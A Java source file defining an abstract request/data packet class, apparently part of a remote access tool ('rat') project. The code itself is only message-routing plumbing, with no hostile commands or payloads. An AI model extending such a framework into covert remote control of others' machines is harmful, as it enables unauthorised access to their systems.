package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveClient;

public abstract class AbstractPingPongPacket implements IPacket {
	
	protected byte type;
	
	public static final byte REQUEST = 0;
	public static final byte DATA = 1;
	
	public AbstractPingPongPacket(final byte type) {
		this.type = type;
	}
	
	public AbstractPingPongPacket() {
		this(REQUEST);
	}
	
	protected abstract void sendRequest(final ActiveClient client);
	
	protected abstract void sendData(final ActiveClient client);
	
	protected abstract void receiveRequest(final ActiveClient client);
	
	protected abstract void receiveData(final ActiveClient client);
	
	protected abstract void executeRequest(final ActiveClient client);
	
	protected abstract void executeData(final ActiveClient client);
	
	@Override
	public final void send(final ActiveClient client) {
		client.writeByte(type);
		
		if (type == REQUEST) {
			sendRequest(client);
		} else if (type == DATA) {
			sendData(client);
		}
	}
	
	@Override
	public final void receive(final ActiveClient client) {
		type = client.readByte();
		
		if (type == REQUEST) {
			receiveRequest(client);
		} else if (type == DATA) {
			receiveData(client);
		}
	}
	
	@Override
	public final void execute(final ActiveClient client) {
		if (type == REQUEST) {
			executeRequest(client);
		} else if (type == DATA) {
			executeData(client);
		}
	}
	
	public final byte getType() {
		return type;
	}
	
}
